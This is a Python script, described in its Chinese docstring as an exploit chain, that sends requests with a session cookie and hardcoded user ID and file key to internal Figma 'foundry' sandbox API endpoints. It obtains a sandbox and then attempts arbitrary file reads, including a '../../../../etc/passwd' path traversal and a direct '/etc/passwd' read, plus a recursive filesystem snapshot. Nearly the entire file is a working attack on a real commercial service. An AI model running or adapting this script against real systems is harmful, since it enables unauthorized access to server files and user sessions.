"""foundry sandbox 利用链:获取沙箱 → 文件读取/写入/枚举
schema: 1037 chunk 136858 (sandbox=A/b, fs-read-file=ei, fs-snapshot=ee, files=R/N, install=j/U)
"""
import io, json, urllib.request, sys, uuid
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call(label, path, body=None, method="POST", file_key=PUB_KEY, uid=UID, extra=None):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web"}
    if uid: hdrs["X-Figma-User-ID"] = uid
    if file_key is not None: hdrs["X-Figma-File-Key"] = file_key
    if extra: hdrs.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=15)
        resp = r.read().decode(errors='replace')
        print(f"[{label}] {r.status}  {len(resp)}B  {resp[:400]}")
        return resp
    except urllib.error.HTTPError as e:
        resp = e.read().decode(errors='replace')
        print(f"[{label}] {e.code}  {resp[:400]}")
        return resp
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:80]}")
        return ""

print("======== 1. 获取 sandbox ========")
r = call("sandbox", "/api/cortex/foundry/sandbox", {})
sbox = None
try:
    sbox = json.loads(r)
    sboxd = sbox.get("sboxdUrl", "")
    print("sboxdUrl:", sboxd, "| state:", sbox.get("state"))
except Exception as e:
    print("parse fail", e); sboxd = ""

if sboxd:
    print()
    print("======== 2. fs-read-file 读 package.json ========")
    call("read pkgjson", "/api/cortex/foundry/fs-read-file", {"sboxdUrl": sboxd, "path": "package.json"})
    print()
    print("======== 3. fs-read-file 读 . ========")
    call("read .", "/api/cortex/foundry/fs-read-file", {"sboxdUrl": sboxd, "path": "."})
    print()
    print("======== 4. fs-read-file 读 ../../etc/passwd ========")
    call("read traversal", "/api/cortex/foundry/fs-read-file", {"sboxdUrl": sboxd, "path": "../../../../etc/passwd"})
    print()
    print("======== 5. fs-read-file 读 /etc/passwd ========")
    call("read /etc/passwd", "/api/cortex/foundry/fs-read-file", {"sboxdUrl": sboxd, "path": "/etc/passwd"})
    print()
    print("======== 6. fs-snapshot(流式) ========")
    call("snapshot", "/api/cortex/foundry/fs-snapshot", {"sboxdUrl": sboxd, "path": ".", "options": {"listing": "recursive", "content": "none"}})
